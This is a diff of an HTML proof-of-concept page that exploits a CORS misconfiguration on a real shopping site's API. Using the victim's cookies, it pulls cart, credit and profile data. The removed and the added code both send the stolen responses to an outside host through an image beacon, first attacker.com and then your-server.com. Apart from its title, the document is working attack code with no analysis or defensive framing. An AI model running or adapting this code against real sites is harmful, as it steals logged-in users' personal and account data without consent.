@@ -2,57 +2,51 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CORS Exploit PoC</title>
+<title>CORS PoC</title>
 </head>
 
 <body>
+
 <h2>Loading...</h2>
+<pre id="out"></pre>
 
 <script>
 
-async function steal(url, name) {
-    try {
-        let res = await fetch(url, {
-            method: "GET",
-            credentials: "include",
-            headers: {
-                "Accept": "application/json"
-            }
-        });
+function log(label, data){
+    document.getElementById("out").innerText += 
+        "[DATA] " + label + JSON.stringify(data) + "\n";
+}
 
-        if (!res.ok) return;
 
-        let text = await res.text();
+const endpoints = {
+    cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+    count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
+};
 
-        // check for real data
-        if (text.length > 20 && text.includes("code")) {
+for (let key in endpoints){
 
-            console.log("[+] Data from:", name, text);
-
-            let pre = document.createElement("pre");
-            pre.innerText = "[DATA] " + name + "\n" + text;
-            document.body.appendChild(pre);
-
-            // exfiltration
-            new Image().src = "https://attacker.com/log?d=" + btoa(name + ":" + text);
-
+    fetch(endpoints[key], {
+        method: "GET",
+        credentials: "include",
+        headers: {
+            "Accept": "application/json, text/plain, */*"
         }
+    })
+    .then(r => r.json())
+    .then(data => {
+        log(key, data);
 
-    } catch (e) {
-        console.log("Error:", e);
-    }
+        // exfiltration
+        new Image().src =
+            "https://your-server.com/log?d=" +
+            btoa(key + ":" + JSON.stringify(data));
+
+    })
+    .catch(e => {
+        log(key, {error: e.toString()});
+    });
+
 }
-
-function runExploit() {
-
-    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
-    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
-    steal("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credits");
-    steal("https://www.opposhop.cn/cn/oapi/users/web/member/check?unpaid=0&cartNumber=0", "profile");
-
-}
-
-runExploit();
 
 </script>
 
